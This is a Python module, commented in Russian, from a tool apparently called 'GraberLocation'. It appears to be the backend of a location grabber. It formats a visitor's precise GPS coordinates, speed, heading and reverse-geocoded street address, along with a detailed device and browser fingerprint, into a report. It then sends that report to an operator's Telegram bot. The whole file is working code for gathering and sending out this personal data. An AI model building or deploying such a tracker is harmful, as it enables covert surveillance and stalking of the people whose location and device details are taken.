"""Общая логика отчёта: геокодинг и Telegram (локальный server.py и Vercel api/report)."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request

NOMINATIM_UA = "GraberLocation/1.0 (contact via repo)"


def reverse_geocode(lat: float, lon: float) -> str | None:
    q = urllib.parse.urlencode(
        {"lat": lat, "lon": lon, "format": "json", "accept-language": "ru"}
    )
    url = f"https://nominatim.openstreetmap.org/reverse?{q}"
    req = urllib.request.Request(url, headers={"User-Agent": NOMINATIM_UA})
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="replace"))
        return data.get("display_name")
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, OSError):
        return None


def telegram_send_message(token: str, chat_id: str, text: str) -> None:
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    body = json.dumps(
        {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    ).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json; charset=utf-8"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        raw = resp.read().decode("utf-8", errors="replace")
    data = json.loads(raw)
    if not data.get("ok"):
        raise RuntimeError(raw[:500])


def format_report(payload: dict, address: str | None) -> str:
    g = payload.get("geolocation") or {}
    env = payload.get("env") or {}
    lines = [
        "📍 Отчёт геолокации",
        f"Время (клиент): {payload.get('collectedAt', '—')}",
        "",
        "— Координаты —",
        f"lat: {g.get('latitude')}",
        f"lon: {g.get('longitude')}",
        f"точность, м: {g.get('accuracyM')}",
        f"высота: {g.get('altitude')}",
        f"скорость: {g.get('speed')}",
        f"направление: {g.get('heading')}",
        "",
        "— Адрес (обратное геокодирование) —",
        address or "(не удалось получить)",
        "",
        "— Устройство / браузер —",
        f"UA: {env.get('userAgent', '')[:400]}",
        f"platform: {env.get('platform')}",
        f"lang: {env.get('language')} {env.get('languages')}",
        f"cores: {env.get('hardwareConcurrency')} RAM(GB est.): {env.get('deviceMemory')}",
        f"touch points: {env.get('maxTouchPoints')}",
        f"timezone: {env.get('timezone')}",
        f"screen: {env.get('screen')}",
        f"viewport: {env.get('viewport')}",
        f"network: {env.get('network')}",
        f"URL: {env.get('pageUrl')}",
        f"referrer: {env.get('referrer') or '—'}",
        "",
        "— JSON (кратко) —",
    ]
    short = {
        "geolocation": g,
        "env": {k: env.get(k) for k in ("platform", "language", "timezone", "pageUrl")},
    }
    lines.append(json.dumps(short, ensure_ascii=False)[:1500])
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3997] + "..."
    return text
